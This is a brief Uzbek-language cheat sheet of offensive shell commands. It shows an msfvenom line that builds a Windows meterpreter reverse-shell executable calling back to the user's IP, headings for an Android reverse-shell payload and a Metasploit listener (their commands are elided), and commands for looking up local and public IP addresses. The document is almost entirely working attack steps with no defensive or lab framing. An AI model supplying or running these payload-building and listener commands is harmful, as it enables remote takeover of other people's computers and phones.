...
# 💻 WINDOWS PAYLOAD YARATISH
# Bu buyruq Windows uchun meterpreter reverse shell yaratadi
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe > payload.exe

# 📱 ANDROID PAYLOAD YARATISH
# Android qurilmalar uchun teskari ulanish (reverse shell) hosil qiladi
...
# 🎯 METASPLOIT CONSOLE ISHLATISH
# Metasploit Framework’ni oching
msfconsole

# 🌐 METASPLOIT LISTENER ISHLATISH
# Windows yoki Android qurilmadan aloqa olish uchun listener sozlash
...
# Agar tarmoq ichida ishlayotgan bo‘lsangiz:
ip a
# Yoki eski usul:
ifconfig
# Sizning IP "wlan0" yoki "eth0" dan keyin "inet" sifatida chiqadi

# 🌍 JAMOATCHI (Tashqi) IP MANZILNI TEKSHIRISH
# Internetdagi haqiqiy IP’ingizni bilish:
curl ifconfig.me
# Yoki
curl icanhazip.com
